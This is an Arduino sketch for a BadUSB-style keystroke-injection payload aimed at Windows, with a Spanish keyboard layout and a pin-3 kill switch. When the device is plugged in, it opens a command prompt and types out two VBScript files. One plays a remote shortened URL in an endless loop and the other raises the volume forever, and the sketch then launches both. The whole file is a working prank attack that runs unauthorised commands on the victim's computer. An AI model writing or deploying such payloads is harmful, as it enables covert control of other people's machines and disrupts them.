/*
 * Keep in mind this payload is made to stop it with a button in pin 3 to stop the payload to execute <3
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
    pinMode(3, INPUT_PULLUP);
    if (digitalRead(3) == LOW){
        while(1);
    }
  // Begining the Keyboard stream
  // The keyboard is set to spanish!!!
  Keyboard.begin(KeyboardLayout_es_ES);


  delay(3500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("cd %tmp% && copy con rickyou.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("While true");

  typeKey(KEY_RETURN);

  Keyboard.print("Dim oPlayer");

  typeKey(KEY_RETURN);

  Keyboard.print("Set oPlayer = CreateObject(\"WMPlayer.OCX\")");

  typeKey(KEY_RETURN);

  Keyboard.print("oPlayer.URL = \"http://tinyurl.com/s63ve48\"");

  typeKey(KEY_RETURN);

  Keyboard.print("oPlayer.controls.play");

  typeKey(KEY_RETURN);

  Keyboard.print("While oPlayer.playState <> 1 ' 1 = Stopped");

  typeKey(KEY_RETURN);

  Keyboard.print("WScript.Sleep 100");

  typeKey(KEY_RETURN);

  Keyboard.print("Wend");

  typeKey(KEY_RETURN);

  Keyboard.print("oPlayer.close");

  typeKey(KEY_RETURN);

  Keyboard.print("Wend");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print("copy con volup.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("do");

  typeKey(KEY_RETURN);

  Keyboard.print("Set WshShell = CreateObject(\"WScript.Shell\")");

  typeKey(KEY_RETURN);

  Keyboard.print("WshShell.SendKeys(chr(&hAF))");

  typeKey(KEY_RETURN);

  Keyboard.print("WScript.Sleep 10");

  typeKey(KEY_RETURN);

  Keyboard.print("loop");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print("start rickyou.vbs && volup.vbs");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}